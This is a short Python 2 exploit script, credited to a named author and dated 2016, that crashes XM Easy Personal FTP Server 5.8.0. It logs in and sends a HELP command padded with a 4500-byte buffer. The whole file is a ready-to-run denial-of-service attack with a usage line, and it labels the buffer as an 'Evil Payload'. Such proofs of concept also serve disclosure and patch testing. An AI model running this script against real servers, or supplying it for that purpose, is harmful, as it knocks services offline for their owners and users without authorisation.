#!/usr/bin/python
#XM Easy Personal FTP Server 5.8.0 (HELP) Denial of Service
#Tested on : Windows XP SP 3 EN
#Author : Pawan Lal   dxb.pawan@gmail.com
#Date : 18-02-2016
 
import socket
import sys
  
def Usage():
    print ("Usage: ./ftpxmftpdosbackup.py <FTP IP> <Username> <Password>\n")
buffer= "A" * 4500
def start(hostname, username, passwd):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    print "[+] " + r
    sock.send("user %s\r\n" %username)
    r=sock.recv(1024)
    sock.send("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    print "[+] Evil Payload i.e buffer"
    sock.send("HELP %s\r\n" %buffer)
    sock.close()
  
if len(sys.argv) <> 4:
    Usage()
    sys.exit(1)
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    start(hostname,username,passwd)
    sys.exit(0)